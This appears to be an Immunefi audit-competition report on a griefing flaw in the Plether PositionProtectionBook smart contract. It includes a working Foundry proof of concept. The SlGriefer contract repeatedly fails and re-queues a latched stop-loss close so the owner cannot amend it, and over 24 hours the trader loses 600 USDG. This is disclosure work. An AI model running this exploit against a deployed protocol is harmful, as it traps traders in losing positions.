# \#98236 [SC-High] Anyone can block the owner's only repair path for a Latched protection (incomplete MED-9 fix), keeping the trader locked in a losing position

**Submitted on Nov 6th 2026 at 06:40:14 UTC by @Naresh_Kandula for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98236
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

**Severity claimed:** Medium. Impact row: *Griefing (no profit motive for an attacker, but damage to the users or the protocol)*.
**Target:** `packages/perps/src/PositionProtectionBook.sol` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

## Brief/Intro

After a triggered TP/SL close fails, the protection becomes `Latched`. The repair the team chose for Cecuro MED-9 is that the owner amends the retained close ceilings and the position then closes on a retry. The MED-9 response says: *"Only the owner may amend the retained ceilings while protection is Latched … Tight limits may prevent execution until conditions improve or the owner amends them."*

`amendLatchedPositionProtectionCloseLimits` works only while the account has **no pending Router order** (`PositionProtectionBook.sol:323-325`). `retryPositionProtectionClose` is **permissionless** and creates exactly such a pending order. It resolves the protection with `_activeProtection` (`:385`), not `_ownedActiveProtection`, and charges no execution bounty.

So a third party can wrap two calls in one transaction:

1. `executeOrder(attempt, …)` on the live attempt, with a fresh tick (it fails on the owner's ceiling) or with no data after the deadline (it expires).
2. `retryPositionProtectionClose(protectionId)`.

The owner never sees `pendingOrderCounts == 0`. Every exit the owner has reverts:

| Owner action | Result while the griefer loops |
|---|---|
| `amendLatchedPositionProtectionCloseLimits` | `OrderRouter__ProtectionNotLatched` (status is `Triggered` while an attempt is live; `:320-322`). In the gap between calls it would be `PendingOrdersExist` (`:323-325`) |
| `cancelPositionProtection` / `cancelPositionProtectionAndCommitClose` | `OrderRouter__ProtectionNotArmed` (only `PendingOpen` or `Armed` can cancel, `:414-419`) |
| `OrderRouter.commitOrder(close)` | `OrderRouter__ProtectionActive` (protection lock, `router/OrderLiquidationBatchLogic.sol:313-315`) |

The trader keeps a position they are trying to exit. Each attempt fails on the trader's own stale ceiling while the market moves further against them, until liquidation or until the griefer stops.

## Root cause

The MED-9 fix added an owner-only repair, `amend`, that needs a quiet window (no pending order). It left the retry that fills that window permissionless, with zero bounty and no owner priority. The two rules together let any address keep the repair path closed for as long as it wants. Each cycle costs only gas: the retry has zero bounty, `getUpdateFee` is 0 on Arbitrum Pyth, and expiry needs no Pyth data at all.

Nothing in the docs or audits describes a third party using the retry to block the amend. MED-9 and `CANONICAL_ENTRYPOINTS.md:145-148` present amend as an available remedy. The AI scan item (scan:584, "a Triggered or Latched protection cannot be cancelled") covers cancellation only. That makes amend the one exit left, and this issue removes it.

## Impact (measured)

PoC `test_Attack_OwnerLockedWhileLossGrows` uses the project's `BasePerpTest` stack (real Router, Book, Engine, Clearinghouse and HousePool; mock Pyth only):

- LONG 10,000 units at 1.00, margin 2,000 USDG, stop-loss 1.05, close ceiling `maxExecutionNotionalAssets = size × 1.05`.
- The price gaps to 1.06 and the SL attempt fails on the ceiling, so the protection is `Latched`.
- **Control** (`test_Control_OwnerExitsAtGap`): the owner amends and exits at 1.06. Final balance **19,391.56 USDG**.
- **Attack:** the griefer runs 1,417 cycles over **86,437 s (24 h)** while the price drifts to 1.12. All three owner levers revert at every check. When the griefer stops, the owner amends and exits at 1.12. Final balance **18,791.31 USDG**.
- **Damage to the victim: 600.25 USDG (about 30% of posted margin) over 24 h.** The attacker spends gas only. A larger adverse move takes the position to liquidation: the attacker cannot stop liquidation, but they can keep the owner from exiting before it.

`B_PROT_PROT1.t.sol` (test A) reproduces the same lock with an adverse tick per cycle (50/50 cycles, owner has 0 working levers). Test A2 holds it for 24 h with expiry only, no Pyth data.

## Scope of affected users and an honest limitation

`test_Mitigation_BatchingOwnerEscapes` shows that an owner who can batch calls atomically escapes. A contract account that does `executeOrder → amend → retry` in one transaction leaves the griefer no window. The release's SimpleAccount v0.8 has `executeBatch`, so its users can escape **if their client knows to do this**. The documented client path (`DEPLOYMENT.md:440-447`, `CANONICAL_ENTRYPOINTS.md`) says nothing about it.

The users who are locked in are:

- EOA traders, which the Router accepts as accounts;
- smart accounts without batching;
- any integration that follows the documented sequential amend-then-retry flow.

## Recommendation

Do one of the following:

- (a) Make `retryPositionProtectionClose` owner-only for a grace period after each relatch, e.g. one execution window.
- (b) Let `amendLatchedPositionProtectionCloseLimits` also accept a protection with a live attempt and apply the new limits to that attempt, or cancel it.
- (c) Add an owner-only `amendAndRetry` that atomically terminalizes the live attempt, amends and re-queues.

Option (c) matches what the batching mitigation does, and makes it available to every account.

## Proof of Concept

## Proof of Concept

Add `packages/perps/test/perps/r3/B_PROT_PROT1_SL.t.sol` (below) and run:

```
cd packages/perps
forge test --root . --match-path test/perps/r3/B_PROT_PROT1_SL.t.sol -vv
```

Expected output:

```
[PASS] test_Attack_OwnerLockedWhileLossGrows()
  griefer cycles 1417
  seconds owner locked out 86437
  attack: owner balance after exit at 1.12 18791311324
[PASS] test_Control_OwnerExitsAtGap()
  control: owner balance after exit at 1.06 19391560000
[PASS] test_Mitigation_BatchingOwnerEscapes()
```

Notes:

- The position is opened with the project's own `BasePerpTest._open` helper. The attack itself uses only public, unprivileged entrypoints: `triggerPositionProtection`, `executeOrder` and `retryPositionProtectionClose`.
- If unrelated broken test files in the workspace stop the build, add `--skip` for them. At the pin, `MCH_C.t.sol` and `CfdCollateralSnapshotParity.t.sol` fail to compile after the #131 rename.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {console2} from "forge-std/console2.sol";

interface IRouterExec {
    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);
}

/// @notice Unprivileged griefer. In one transaction it terminalizes the live protection attempt (failed or expired)
///         and immediately re-queues a fresh attempt with the permissionless retry, so the owner never sees
///         pendingOrderCounts == 0, which amendLatchedPositionProtectionCloseLimits requires.
contract SlGriefer {

    IRouterExec internal immutable router;
    IPositionProtectionActions internal immutable book;

    constructor(
        address router_,
        address book_
    ) {
        router = IRouterExec(router_);
        book = IPositionProtectionActions(book_);
    }

    function trigger(
        uint64 protectionId,
        bytes[] calldata data
    ) external returns (uint64) {
        return book.triggerPositionProtection(protectionId, data);
    }

    function failAndRetry(
        uint64 orderId,
        bytes[] calldata data,
        uint64 protectionId
    ) external returns (uint64 nextAttempt) {
        router.executeOrder(orderId, data);
        nextAttempt = book.retryPositionProtectionClose(protectionId);
    }

}


/// @notice Stand-in for a batching smart account (e.g. SimpleAccount.executeBatch): terminalize + amend + retry in one tx.
contract BatchingOwner {

    function act(address target, bytes calldata data) external returns (bytes memory ret) {
        bool ok;
        (ok, ret) = target.call(data);
        require(ok, "call failed");
    }

    function escape(
        address router,
        address book,
        uint64 attempt,
        bytes[] calldata data,
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata loose
    ) external returns (uint64 retry) {
        IRouterExec(router).executeOrder(attempt, data);
        IPositionProtectionActions(book).amendLatchedPositionProtectionCloseLimits(protectionId, loose);
        retry = IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }

}

/// @notice Stop-loss variant with measured damage. A LONG loses as the basket price rises, and its stop-loss fires at
///         price >= SL. The owner's close ceiling is sized to the SL price. After a gap above SL every attempt fails,
///         so the protection latches. The repair the protocol provides for exactly this case is to amend the latched
///         limits and retry (Cecuro MED-9 fix). A third party keeps the owner out of that path while the price keeps
///         moving against them.
contract B_PROT_PROT1_SL is BasePerpTest {

    IPositionProtectionActions internal book;
    IPositionProtectionViews internal views;
    SlGriefer internal griefer;

    address internal constant ALICE = address(0xA11CE);
    address internal constant KEEPER = address(0xE0EC);

    uint256 internal constant ENTRY = 1e8;
    uint256 internal constant SIZE = 10_000e18;
    uint256 internal constant MARGIN = 2000e6;
    uint256 internal constant STOP_LOSS = 105_000_000; // 1.05
    uint256 internal constant GAP = 106_000_000; // first tick after the trigger, above the owner's ceiling
    uint256 internal constant LATER = 112_000_000; // price after the lock-out window

    function setUp() public override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        griefer = new SlGriefer(address(router), address(book));
        _fundTrader(ALICE, 20_000e6);
        _mockPythUpdateData(ENTRY);
        router.updateMarkPrice(_mockPythUpdateData(ENTRY));
    }

    function _limits(
        uint256 maxNotional
    ) internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l.maxExecutionNotionalAssets = maxNotional;
        l.maxGrossAccountDebitAssets = type(uint256).max;
        l.maxActionChargeAssets = type(uint256).max;
        l.maxExplicitFeesAssets = type(uint256).max;
    }

    function _setupTriggered() internal returns (uint64 protectionId, uint64 attempt) {
        _open(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, ENTRY);
        PositionProtectionTypes.PositionProtectionParams memory p;
        p.stopLossTriggerPrice = STOP_LOSS;
        p.closeLimits = _limits((SIZE * STOP_LOSS) / 1e20); // close at or below the SL price
        vm.prank(ALICE);
        protectionId = book.createPositionProtection(p);
        // Anyone triggers once the mark crosses SL.
        attempt = griefer.trigger(protectionId, _mockPythUpdateData(STOP_LOSS));
    }

    function _equity() internal view returns (uint256) {
        return clearinghouse.balanceAssets(ALICE);
    }

    function _ownerAmendAndCloseAt(
        uint64 protectionId,
        uint256 price
    ) internal {
        vm.prank(ALICE);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, _limits(type(uint256).max));
        uint64 retry = book.retryPositionProtectionClose(protectionId);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = IRouterExec(address(router)).executeOrder(retry, _mockPythUpdateData(price));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended close executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "position closed");
    }

    /// CONTROL: no griefer. The gap tick fails the attempt, protection latches, and the owner amends and exits at GAP.
    function test_Control_OwnerExitsAtGap() public {
        (uint64 protectionId, uint64 attempt) = _setupTriggered();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = IRouterExec(address(router)).executeOrder(attempt, _mockPythUpdateData(GAP));
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "ceiling fails");
        assertEq(uint8(views.getPositionProtection(protectionId).status), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));
        _ownerAmendAndCloseAt(protectionId, GAP);
        console2.log("control: owner balance after exit at 1.06", _equity());
    }

    /// ATTACK: the griefer fails every attempt on an adverse tick and re-queues atomically for 24h while the price
    /// drifts from 1.06 to 1.12. Every owner lever reverts. The griefer then stops and the owner exits at 1.12.
    function test_Attack_OwnerLockedWhileLossGrows() public {
        (uint64 protectionId, uint64 attempt) = _setupTriggered();
        uint256 t0 = vm.getBlockTimestamp();
        uint256 cycles;
        vm.pauseGasMetering();
        while (vm.getBlockTimestamp() < t0 + 24 hours) {
            // price drifts linearly from GAP to LATER over 24h; every tick is above the owner's ceiling
            uint256 elapsed = vm.getBlockTimestamp() - t0;
            uint256 price = GAP + ((LATER - GAP) * elapsed) / 24 hours;
            attempt = griefer.failAndRetry(attempt, _mockPythUpdateData(price), protectionId);
            if (cycles % 100 == 0) {
                assertEq(router.pendingOrderCounts(ALICE), 1, "attempt always pending");
                vm.startPrank(ALICE);
                vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector); // an attempt is live, so status is Triggered
                book.amendLatchedPositionProtectionCloseLimits(protectionId, _limits(type(uint256).max));
                vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
                book.cancelPositionProtection(protectionId);
                vm.stopPrank();
            }
            vm.warp(vm.getBlockTimestamp() + 60);
            cycles++;
        }
        vm.resumeGasMetering();
        (uint256 sizeStill,,,,,,) = engine.positions(ALICE);
        assertEq(sizeStill, SIZE, "position still open after 24h");
        console2.log("griefer cycles", cycles);
        console2.log("seconds owner locked out", vm.getBlockTimestamp() - t0);

        // Griefer stops. The owner can finally repair and exit, at the later price.
        vm.warp(uint256(router.lifecycleBook().orderTiming(attempt).executionDeadline) + 1);
        vm.prank(KEEPER);
        IRouterExec(address(router)).executeOrder(attempt, new bytes[](0)); // expire the last attempt
        _ownerAmendAndCloseAt(protectionId, LATER);
        console2.log("attack: owner balance after exit at 1.12", _equity());
    }

    /// MITIGATION CHECK: an owner that can batch (smart account) escapes in one transaction, because the griefer
    /// cannot interleave between the owner's terminalize, amend and retry calls.
    function test_Mitigation_BatchingOwnerEscapes() public {
        BatchingOwner owner = new BatchingOwner();
        _fundTrader(address(owner), 20_000e6);
        _open(address(owner), CfdTypes.Side.LONG, SIZE, MARGIN, ENTRY);
        PositionProtectionTypes.PositionProtectionParams memory p;
        p.stopLossTriggerPrice = STOP_LOSS;
        p.closeLimits = _limits((SIZE * STOP_LOSS) / 1e20);
        bytes memory ret = owner.act(address(book), abi.encodeCall(book.createPositionProtection, (p)));
        uint64 protectionId = abi.decode(ret, (uint64));
        uint64 attempt = griefer.trigger(protectionId, _mockPythUpdateData(STOP_LOSS));
        attempt = griefer.failAndRetry(attempt, _mockPythUpdateData(GAP), protectionId);
        uint64 retry = owner.escape(address(router), address(book), attempt, _mockPythUpdateData(GAP), protectionId, _limits(type(uint256).max));
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = IRouterExec(address(router)).executeOrder(retry, _mockPythUpdateData(GAP));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "batching owner escapes");
    }

}
```
